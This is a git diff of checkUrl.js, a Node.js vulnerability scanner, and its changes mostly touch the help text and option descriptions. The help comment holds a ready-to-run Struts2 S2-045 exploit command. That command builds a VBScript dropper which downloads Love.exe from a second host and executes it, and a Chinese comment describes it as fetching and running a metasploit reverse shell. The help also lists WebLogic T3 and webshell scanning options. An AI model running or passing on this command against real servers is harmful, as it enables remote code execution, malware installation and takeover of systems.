@@ -38,8 +38,8 @@ process.on('unhandledRejection', fnError);
 
 var fnHelp = function(){
 /*
-  Usage: checkUrl [options]
-利用struts2 045漏洞，下载metasploit反弹程序并执行，以下在一行中
+
+# 利用struts2 045漏洞，下载metasploit反弹程序并执行，以下在一行中
 node checkUrl.js -u http://192.168.10.115:8080/PortalServer/customize/defaultZh/auth.jsp --struts2 045 --cmd 'del poc.vbs& del mess.exe& @echo Set objXMLHTTP=CreateObject("MSXML2.XMLHTTP")>poc.vbs&@echo objXMLHTTP.open "GET","http://192.168.24.15:8080/Love.exe",false>>poc.vbs&@echo objXMLHTTP.send()>>poc.vbs&@echo If objXMLHTTP.Status=200 Then>>poc.vbs&@echo Set objADOStream=CreateObject("ADODB.Stream")>>poc.vbs&@echo objADOStream.Open>>poc.vbs&@echo objADOStream.Type=1 >>poc.vbs&@echo objADOStream.Write objXMLHTTP.ResponseBody>>poc.vbs&@echo objADOStream.Position=0 >>poc.vbs&@echo objADOStream.SaveToFile "mess.exe">>poc.vbs&@echo objADOStream.Close>>poc.vbs&@echo Set objADOStream=Nothing>>poc.vbs&@echo End if>>poc.vbs&@echo Set objXMLHTTP=Nothing>>poc.vbs&@echo Set objShell=CreateObject("WScript.Shell")>>poc.vbs&@echo objShell.Exec("mess.exe")>>poc.vbs&cscript.exe poc.vbs'
 
 node checkUrl.js -u http://192.168.10.15:8080/PortalServer/customize/defaultZh/auth.jsp --struts2 045 --cmd 'tasklist -svc'
@@ -68,32 +68,18 @@ java -jar ./JNDI_TEST/JNDITEST.jar
 # weblogic中间件T3漏洞扫描
 编辑ip.txt
 python ./weblogic.py
-
-  Options:
-
-    -V, --version           output the version number，版本号信息
-    -u, --url [value]       check url, no default，检查的url，没有默认值
-    -p, --proxy [value]     http proxy,eg: http://127.0.0.1:8080, or https://127.0.0.1:8080, no default，设置代理
-    -t, --t3 [value]        check weblogic t3,default false，对T3协议进行检测，可以指定文件名列表进行检测
-    -i, --install           install node modules,run: npm install
-    -v, --verbose           show logs
-    -w, --struts2 [value]   struts2 type,eg: 045
-    -C, --cmd [value]       cmd type,eg: "ping -c 3 www.baidu.com"
-    -o, --timeout           default 5000
-    -l, --pool              default 100
-    -r, --test              test
-    -m, --menu [value]      scan url + menus, default ./urls/ta3menu.txt
-    -s, --webshell [value]  scan webshell url，设置参数才会运行, default ./urls/webshell.txt
-    -d, --method [value]    default PUT,DELETE,OPTIONS,HEAD,PATCH test
-    -a, --host              host attack test,设置代理后该项功能可能无法使用,default true
-    -k, --keys [value]      scan html keywords, default ./urls/keywords
 */
 };
 
+function fnMyHelp()
+{
+	console.log(fnHelp.toString().split(/\n/).slice(2, -2).join('\n'));
+}
+
 program.version(szMyName)
 	.option('-u, --url [value]', 'check url, no default')
-	.option('-p, --proxy [value]', 'http proxy,eg: http://127.0.0.1:8080, or https://127.0.0.1:8080, no default')
-	.option('-t, --t3 [value]', 'check weblogic t3,default false，可以指定列表进行检测')
+	.option('-p, --proxy [value]', 'http proxy,eg: http://127.0.0.1:8080, or https://127.0.0.1:8080, no default，设置代理')
+	.option('-t, --t3 [value]', 'check weblogic t3,default false，对T3协议进行检测，可以指定文件名列表进行检测')
 	.option('-i, --install', 'install node modules,run: npm install')
 	.option('-v, --verbose', 'show logs')
 	.option('-w, --struts2 [value]', 'struts2 type,eg: 045')
@@ -106,6 +92,8 @@ program.version(szMyName)
 	.option('-d, --method [value]', 'default PUT,DELETE,OPTIONS,HEAD,PATCH test')
 	.option('-a, --host ', 'host attack test,设置代理后该项功能可能无法使用,default true')
 	.option('-k, --keys [value]', 'scan html keywords, default ./urls/keywords')
+	.on('--help',fnMyHelp)
+	
 	.parse(process.argv);
 timeout = program.timeout || timeout;
 g_nPool = program.pool || g_nPool;
